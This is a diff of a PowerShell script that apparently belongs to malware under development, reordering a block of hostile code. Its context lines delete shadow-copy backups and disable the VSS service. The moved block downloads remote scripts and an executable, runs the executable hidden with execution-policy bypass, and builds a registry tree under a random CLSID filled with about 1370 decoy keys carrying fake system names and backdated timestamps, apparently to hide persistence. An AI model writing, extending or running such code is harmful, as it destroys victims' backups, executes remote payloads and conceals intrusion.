@@ -67,52 +67,7 @@ vssadmin delete shadows /for=$env:systemdrive /all /quiet | Out-Null
 net stop vss
 sc.exe config vss start= disabled
 Get-Service vss | Select-Object Status, StartType # debug purpose
-
-$initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-$initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
-$initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-$initServiceFwdmonPath = "$initServiceFwdmonPath\init_service_fwdmon.ps1"
-$initFindePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-$initFindePath = "$initFindePath\$([System.IO.Path]::GetRandomFileName()).exe"
-$g = "{$([guid]::NewGuid().ToString().ToUpper())}"
-$basePath = "HKLM:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
-$main = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 13 | % { [char]$_ })
-New-Item -Path "$basePath" -Force
-New-ItemProperty -Path "$basePath" -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
-$ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs", "Windows_Defender_CrashDumps", "ServiceHost_Spooler", "RDP_Encryption_Junk", "NVIDIA_Driver_Dumpster", "UpdateOrchestrator_Failures", "LSA_Secret_Trash", "WMI_Execution_Garbage", "TaskScheduler_Fuckups", "MSI_Installer_Leftovers", "EventLog_Bloatware", "PowerShell_Module_Clutter", "NetFramework_BrokenAssemblies", "BITS_Transfer_Corruption", "CredentialManager_Leaks", "Firewall_Rule_Chaos" ) 
-$p = Get-Random -Count $ms.Length -In (1..1369)
-$score = Get-Random -Minimum 184 -Maximum 1023
-$rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-$rootPath = "$rootPath\root.ps1"
 $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-iwr -Uri $initServiceRootmonmonUri -OutFile $initServiceRootmonmonPath
-iwr -Uri $initServiceFwdmonUri -OutFile $initServiceFwdmonPath
-iwr -Uri $initFinde -OutFile $initFindePath
-Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initFindePath" -Wait
-
-
-
-
-1..1370 | ForEach-Object {
-    $curr = $_
-    if($p.Contains($curr)){
-        $idx = 0..($p.Count - 1) | Where-Object { $p[$_] -eq $curr }
-        New-Item -Path "$basePath\$($ms[$idx])" -Force | Out-Null
-        New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "LastUpdated" -Value (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") -Force
-        New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "Authority" -Value "SYSTEM" -Force
-    }
-    if($curr -eq $score){   
-        New-Item -Path "$basePath\$main" -Force | Out-Null  
-    }
-
-
-    $subName = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 13 | % { [char]$_ })
-    New-Item -Path "$basePath\$subName" -Force | Out-Null
-    New-ItemProperty -Path "$basePath\$subName" -Name "LastUpdated" -Value (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") -Force | Out-Null
-    New-ItemProperty -Path "$basePath\$subName" -Name "ThreadingModel" -Value "Apartment" -Force | Out-Null
-}
-
-
 
 
 foreach ($path in $ownership) {
@@ -144,6 +99,52 @@ foreach($path in $paths){
         if(Test-Path -Path "$path\text.txt" -PathType Leaf){ Remove-Item -Path "$path\text.txt" -Force }
     }
 }
+
+
+$initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+$initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
+$initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+$initServiceFwdmonPath = "$initServiceFwdmonPath\init_service_fwdmon.ps1"
+$initFindePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+$initFindePath = "$initFindePath\$([System.IO.Path]::GetRandomFileName()).exe"
+$g = "{$([guid]::NewGuid().ToString().ToUpper())}"
+$basePath = "HKLM:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
+$main = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 13 | % { [char]$_ })
+New-Item -Path "$basePath" -Force
+New-ItemProperty -Path "$basePath" -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
+$ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs", "Windows_Defender_CrashDumps", "ServiceHost_Spooler", "RDP_Encryption_Junk", "NVIDIA_Driver_Dumpster", "UpdateOrchestrator_Failures", "LSA_Secret_Trash", "WMI_Execution_Garbage", "TaskScheduler_Fuckups", "MSI_Installer_Leftovers", "EventLog_Bloatware", "PowerShell_Module_Clutter", "NetFramework_BrokenAssemblies", "BITS_Transfer_Corruption", "CredentialManager_Leaks", "Firewall_Rule_Chaos" ) 
+$p = Get-Random -Count $ms.Length -In (1..1369)
+$score = Get-Random -Minimum 184 -Maximum 1023
+$rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+$rootPath = "$rootPath\root.ps1"
+iwr -Uri $initServiceRootmonmonUri -OutFile $initServiceRootmonmonPath
+iwr -Uri $initServiceFwdmonUri -OutFile $initServiceFwdmonPath
+iwr -Uri $initFinde -OutFile $initFindePath
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initFindePath" -Wait
+
+
+
+
+1..1370 | ForEach-Object {
+    $curr = $_
+    if($p.Contains($curr)){
+        $idx = 0..($p.Count - 1) | Where-Object { $p[$_] -eq $curr }
+        New-Item -Path "$basePath\$($ms[$idx])" -Force | Out-Null
+        New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "LastUpdated" -Value (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") -Force
+        New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "Authority" -Value "SYSTEM" -Force
+    }
+    if($curr -eq $score){   
+        New-Item -Path "$basePath\$main" -Force | Out-Null  
+    }
+
+
+    $subName = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 13 | % { [char]$_ })
+    New-Item -Path "$basePath\$subName" -Force | Out-Null
+    New-ItemProperty -Path "$basePath\$subName" -Name "LastUpdated" -Value (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") -Force | Out-Null
+    New-ItemProperty -Path "$basePath\$subName" -Name "ThreadingModel" -Value "Apartment" -Force | Out-Null
+}
+
+
 
 
 
